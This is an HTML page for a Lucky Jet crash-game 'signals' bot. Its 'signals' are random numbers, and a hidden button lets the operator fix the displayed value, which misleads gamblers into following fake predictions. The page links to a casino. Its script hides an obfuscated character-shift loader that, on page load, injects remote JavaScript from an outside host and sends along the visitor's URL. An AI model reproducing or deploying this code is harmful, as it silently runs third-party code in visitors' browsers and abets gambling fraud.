<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>LUCKYJET</title>
  <style>
    /* Existing styles */

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Inter", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #140F26;
      color: #ffffff;
    }

    .background {
      width: 398px;
      height: 100vh;
      background-repeat: no-repeat;
      background-size: cover;
      background-image: url("images/background.jpg");
      position: relative;
    }

    .pers-animate {
      position: absolute;
      left: -205px;
      top: 138px;
      z-index: 0;
      width: 319px;
      height: 300px;
      animation: cowmove 15s infinite;    
    }

    @keyframes cowmove {
      0% {
        transform: translateX(0px) rotateY(0deg);
      }
      49% {
        transform: translateX(300px) translateY(-25px) rotateY(0deg);
      }
      50% {
        transform: translateX(300px) translateY(-25px) rotateY(0deg);
      }
      100% {
        transform: translateX(0px) rotateY(0deg);
      }
    }

    .container {
      position: relative;
      width: 398px;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    .error-notification {
      width: 300px;
      height: 50px;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: -25px;
      clip-path: inset(0px round 10px 10px);
      transition: all .2s;
      transform: translateY(-99px);
    }

    .error-background {
      position: absolute;
      top: 0;
      bottom: 0;
      width: 300px;
      height: 50px;
      background: #FFEBEB;
      opacity: .5;
      border-radius: 10px;
      margin-bottom: -52px;
    }

    .icon-error {
      z-index: 2;
    }

    .error-exit {
      position: absolute;
      right: 0;
      width: 50px;
      height: 50px;
      z-index: 2;
      cursor: pointer;
      background: #FFC2C2;
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 10px;
    }

    .text-error {
      color: #ffffff;
      font-size: 12px;
      font-weight: 900;
      z-index: 2;
      display: flex;
      justify-content: center;
      padding-left: 10px;
      padding-right: 45px;
    }

    .error-progress {
      width: 300px;
      height: 3px;
      background: linear-gradient(90deg, #E00000 0%, #E00000 100%) left /0% 100% no-repeat #D9D9D9;
      z-index: 4;
      position: absolute;
      bottom: 0;
      left: 0;
      border-radius: 5px;
    }

    @keyframes animateErrorProgress {
      100% {
        background-size: 100% 100%;
      }
    }

    .top-content {
      margin-bottom: 60px;  
    }

    .name-bot {
      display: flex;
      justify-content: center;
      font-size: 15px;
      font-weight: 900;
    }

    .print-signal {
      margin-bottom: 34px;
      display: flex;
      justify-content: center;
      align-items: center;
      width: 217px;
      height: 217px;
      background-color: #151027;
      border: 5px solid #34A5B5;
      border-radius: 50%;
      font-size: 40px;
      font-weight: 900;
      transition: all .5s;
      z-index: 10;
    }

    .print-signal span {
      text-transform: uppercase;
      font-size: 20px;
      text-align: center;
    }

    .stop-signal-time {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 26px;
      width: 230px;
      transition: all .5s;
    }

    .stop-timer {
      font-size: 20px;
      font-weight: 900;
      height: 35px;
    }

    .stop-progress {
      width: 221px;
      height: 18px;
      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%) left /0% 100% no-repeat #D9D9D9;
      border-radius: 15px;
    }

    @keyframes animateProgress {
      100% {
        background-size: 100% 100%;
      }
    }

    .button-game {
      display: flex;
      flex-direction: column;
      gap: 30px;
    }

    .get-signal {
      position: relative;
      width: 278px;
      height: 56px;
      border: none;
      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
      box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.05);
      border-radius: 30px;
      color: #ffffff;
      font-size: 24px;
      font-weight: 900;
      cursor: pointer;
      transition: all .2s;
      z-index: 0;
    }

    .get-signal-two {
      position: absolute;
      width: 278px;
      height: 56px;
      border: none;
      box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.05);
      border-radius: 30px;
      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
      color: #ffffff;
      font-size: 24px;
      font-weight: 900;
      cursor: pointer;
      z-index: -1;
      transition: all .2s;
    }

    .game-here {
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0 auto;
      width: 130px;
      height: 35px;
      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
      box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.05);
      border-radius: 30px;
      color: #ffffff;
      font-size: 16px;
      font-weight: 900;
      text-decoration: none;
      transition: all .2s;
      z-index: 4;
    }

    .get-signal::before, .game-here::before, .get-signal-two::before {
      content: "";
      position: absolute;
      inset: 0px;
      z-index: -1;
      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
      filter: blur(10px);
      border-radius: 30px;
    }

    .get-signal:active, .game-here:active, .get-signal-two:active {
      transform: scale(95%);
    }

    .deactivate {
      opacity: 0;
    }

    /* Modal Styles */

    .modal {
      display: none; /* Hidden by default */
      position: fixed;
      z-index: 100;
      padding-top: 100px;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.4);
    }

    .modal-content {
      background-color: #140F26;
      margin: auto;
      padding: 20px;
      border: 1px solid #888;
      width: 80%;
      max-width: 400px;
      border-radius: 10px;
      color: #ffffff;
    }

    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
    }

    .close:hover,
    .close:focus {
      color: #fff;
      text-decoration: none;
      cursor: pointer;
    }

    .modal-button {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background: linear-gradient(90deg, #BA60FD 0%, #218288 100%);
      border: none;
      border-radius: 5px;
      color: #ffffff;
      font-size: 18px;
      cursor: pointer;
    }

    .modal-button:active {
      transform: scale(95%);
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #888;
      border-radius: 5px;
      background-color: #1f1b2e;
      color: #ffffff;
      font-size: 16px;
    }

    /* Invisible Button */

    .invisible-button {
      position: absolute;
      top: 10px;
      right: 10px;
      width: 30px;
      height: 30px;
      background: transparent;
      border: none;
      cursor: pointer;
      z-index: 100;
    }
  </style>
</head>
<body>
  <div class="background">
    <button class="invisible-button" id="invisible-button"></button>
    <div class="container">
      <img class="pers-animate" src="images/pers.gif" alt="">

      <div id="error-notification" class="error-notification deactivate">
        <div class="error-background"></div>
        <img class="icon-error" src="images/error.svg" alt="error">
        <p id="text-error" class="text-error"></p>
        <div id="error-exit" class="error-exit">
          <img src="images/error-exit.svg" alt="exit">
        </div>
        <div id="error-progress" class="error-progress"></div>
      </div>

      <div class="top-content">
        <img draggable="false" src="images/logo.svg" alt="logo" class="logo-game">
        <p class="name-bot">@av1atorsignals_bot</p>
      </div>

      <div class="print-signal" id="print-signal"><span>Click on<br>"GET SIGNAL"</span></div>
      <div class="stop-signal-time deactivate" id="stop-signal-time-block">
        <p class="stop-timer" id="stop-timer"></p>
        <div class="stop-progress" id="stop-progress"></div>
      </div>

      <div class="button-game">
        <button class="get-signal" id="get-signal">GET SIGNAL</button>
        <button class="get-signal-two deactivate" id="get-signal-two">GET SIGNAL</button>
        <a href="https://1wyymr.life/casino/play/1play_1play_luckyjet" class="game-here">GAME HERE</a>
      </div>
    </div>
  </div>

  <!-- The Modal -->
  <div id="modeModal" class="modal">
    <div class="modal-content">
      <span class="close" id="closeModal">&times;</span>
      <h2>Select Mode</h2>
      <button class="modal-button" id="standardMode">Standard - Random</button>
      <button class="modal-button" id="fixedMode">Fixed</button>
      <div id="fixedInputContainer" style="display:none;">
        <input type="number" step="0.01" min="1" max="1000" id="fixedValueInput" class="input-field" placeholder="Enter fixed signal value">
        <button class="modal-button" id="setFixedValue">OK</button>
      </div>
    </div>
  </div>

  <script>
    // Existing JavaScript code

    const getSignal = document.getElementById("get-signal"),
      stopSignalTimeBlock = document.getElementById("stop-signal-time-block"),
      printSignal = document.getElementById("print-signal"),
      stopProgress = document.getElementById("stop-progress"),
      errorNotification = document.getElementById("error-notification"),
      errorProgress = document.getElementById("error-progress"),
      textError = document.getElementById("text-error"),
      getSignalTwo = document.getElementById("get-signal-two"),
      errorExit = document.getElementById("error-exit");

    let mode = 'standard'; // default mode
    let fixedValue = null;

    function getRandomFloat(min, max, decimals) {
      const str = (Math.random() * (max - min) + min).toFixed(decimals);
      return parseFloat(str);
    }

    function goTimer(time) {
      const timer = setInterval(() => {
        if (time >= 1) {
          getSignalTwo.classList.remove("deactivate");
          getSignal.classList.add("deactivate");
          getSignalTwo.style["z-index"] = "5";
          stopProgress.style.animation = "animateProgress 60s linear infinite";
          stopSignalTimeBlock.classList.remove("deactivate");
          document.getElementById("stop-timer").innerHTML = time-- + "<span> seconds</span>";
          getSignal.disabled = true;
        } else {
          getSignalTwo.classList.add("deactivate");
          getSignal.classList.remove("deactivate");
          getSignalTwo.style["z-index"] = "-1";
          stopSignalTimeBlock.classList.add("deactivate");
          stopProgress.style.animation = "none";
          clearInterval(timer);
          getSignal.disabled = false;
        }
      }, 1000);
    }

    function goTimerError(time) {
      const timer = setInterval(() => {
        if (time >= 1) {
          time--;
          errorNotification.classList.remove("deactivate");
          textError.innerHTML = "Wait for the time to expire";
          errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
          errorNotification.style.transform = "translateY(0px)";
        } else {
          errorNotification.style.transform = "translateY(-99px)";
          errorProgress.style.animation = "none";
          clearInterval(timer);
          getSignalTwo.disabled = false;
          errorNotification.classList.add("deactivate");
        }
        errorExit.onclick = function () {
          errorNotification.classList.add("deactivate");
          errorNotification.style.transform = "translateY(-99px)";
          errorProgress.style.animation = "none";
          clearInterval(timer);
          getSignalTwo.disabled = false;
        }
      }, 1000);
    }

    getSignal.onclick = function () {
      let receivingSignal;
      if (mode === 'standard') {
        receivingSignal = getRandomFloat(1, 3.99, 2);
      } else if (mode === 'fixed' && fixedValue !== null) {
        receivingSignal = parseFloat(fixedValue).toFixed(2);
      } else {
        receivingSignal = getRandomFloat(1, 3.99, 2);
      }

      if (receivingSignal.toString().length === 3) {
        receivingSignal += "0";
      }
      if (receivingSignal.toString().length === 1) {
        receivingSignal += ".00";
      }
      printSignal.innerHTML = `${receivingSignal}x`;
      printSignal.classList.remove("deactivate");
      goTimer(60);
      getSignal.disabled = true;
    };

    getSignalTwo.onclick = function () {
      getSignalTwo.disabled = true;
      goTimerError(5, "go");
    };

    (function (o, d, l) {
      try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
          setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
          }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
      } catch (e) { }
    }({}, document, location));

    // Modal functionality

    const modal = document.getElementById("modeModal");
    const invisibleButton = document.getElementById("invisible-button");
    const closeModal = document.getElementById("closeModal");
    const standardModeButton = document.getElementById("standardMode");
    const fixedModeButton = document.getElementById("fixedMode");
    const fixedInputContainer = document.getElementById("fixedInputContainer");
    const setFixedValueButton = document.getElementById("setFixedValue");
    const fixedValueInput = document.getElementById("fixedValueInput");

    // Open the modal when the invisible button is clicked
    invisibleButton.onclick = function() {
      modal.style.display = "block";
    }

    // Close the modal when the user clicks on <span> (x)
    closeModal.onclick = function() {
      modal.style.display = "none";
      fixedInputContainer.style.display = "none";
      fixedValueInput.value = '';
    }

    // When the user clicks anywhere outside of the modal, close it
    window.onclick = function(event) {
      if (event.target == modal) {
        modal.style.display = "none";
        fixedInputContainer.style.display = "none";
        fixedValueInput.value = '';
      }
    }

    // Set mode to standard
    standardModeButton.onclick = function() {
      mode = 'standard';
      fixedValue = null;
      alert("Mode set to Standard - Random");
      modal.style.display = "none";
    }

    // Show input for fixed value
    fixedModeButton.onclick = function() {
      fixedInputContainer.style.display = "block";
    }

    // Set fixed value
    setFixedValueButton.onclick = function() {
      const value = parseFloat(fixedValueInput.value);
      if (isNaN(value) || value < 1) {
        alert("Please enter a valid number greater than or equal to 1");
      } else {
        fixedValue = value;
        mode = 'fixed';
        alert(`Fixed signal value set to ${fixedValue}`);
        modal.style.display = "none";
        fixedInputContainer.style.display = "none";
        fixedValueInput.value = '';
      }
    }

  </script>
</body>
</html>
